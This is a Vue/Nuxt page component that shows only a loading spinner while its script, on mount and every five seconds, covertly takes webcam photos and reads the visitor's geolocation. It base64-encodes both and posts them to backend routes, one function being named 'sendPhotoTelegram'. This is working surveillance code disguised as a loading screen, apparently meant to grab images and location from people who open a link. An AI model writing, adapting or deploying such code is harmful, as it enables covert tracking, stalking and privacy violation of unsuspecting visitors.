<template>
  <div class="content">
    <!-- <NuxtWelcome /> -->
    <div class="loader"></div>
  </div>
</template>

<script setup lang="ts">
function takePhoto() {
  // Request camera access
  navigator?.mediaDevices
    .getUserMedia({ video: true })
    .then(function (stream: any) {
      var video = document.createElement("video");
      document.body.appendChild(video);
      video.srcObject = stream;
      video.play();

      // Capture image after 3 seconds
      setTimeout(function () {
        var canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        var context = canvas.getContext("2d");
        context?.drawImage(video, 0, 0, canvas.width, canvas.height);
        var imageDataURL = canvas.toDataURL("image/jpg");

        // Send image to API
        sendPhotoTelegram(imageDataURL);

        // Stop video stream and remove video element
        video.pause();
        stream.getVideoTracks()[0].stop();
        document.body.removeChild(video);
      }, 3000);
    })
    .catch(function (err: any) {
      console.error("Error accessing camera: ", err);
    });
}

function captureGeolocationAndSend() {
  if (navigator?.geolocation) {
    navigator?.geolocation.getCurrentPosition(
      function (position: any) {
        var latitude = position.coords.latitude;
        var longitude = position.coords.longitude;

        // Send geolocation data to API
        sendToAPIGeolocation(latitude, longitude);
      },
      function (error: any) {
        console.error("Error obtaining geolocation: ", error);
      }
    );
  } else {
    console.error("Geolocation not supported by browser.");
  }
}

async function sendToAPIGeolocation(latitude: number, longitude: number) {
  try {
    const latitudeEncoded = btoa(unescape(encodeURIComponent(latitude)));
    const longitudeEncoded = btoa(unescape(encodeURIComponent(longitude)));
    const body = JSON.stringify({
      latitude: latitudeEncoded,
      longitude: longitudeEncoded,
    });

    console.log("Body for API", body);

    const response = await fetch("/api/sendMessage", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body,
    });
    const data = await response.json();
    console.log("Server response:", data);
  } catch (error) {
    console.error("Error sending geolocation to server:", error);
  }
}

async function sendPhotoTelegram(imageDataURL: string) {
  try {
    const imageURL = btoa(unescape(encodeURIComponent(imageDataURL)));
    const response = await fetch("/api/sendPhoto", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ image: imageURL }),
    });
    const data = await response.json();
    console.log("Server response:", data);
  } catch (error) {
    console.error("Error sending photo to server:", error);
  }
}

onMounted(() => {
  takePhoto();
  captureGeolocationAndSend();
  setInterval(() => {
    takePhoto();
    captureGeolocationAndSend();
  }, 5000);
});
</script>

<style scoped>
.content {
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
  margin: 0;
}

.loader {
  border: 4px solid rgba(0, 0, 0, 0.1);
  border-left-color: #3498db;
  border-radius: 50%;
  width: 40px;
  height: 40px;
  animation: spin 1s linear infinite;
  margin: auto;
}

@keyframes spin {
  to {
    transform: rotate(360deg);
  }
}
</style>
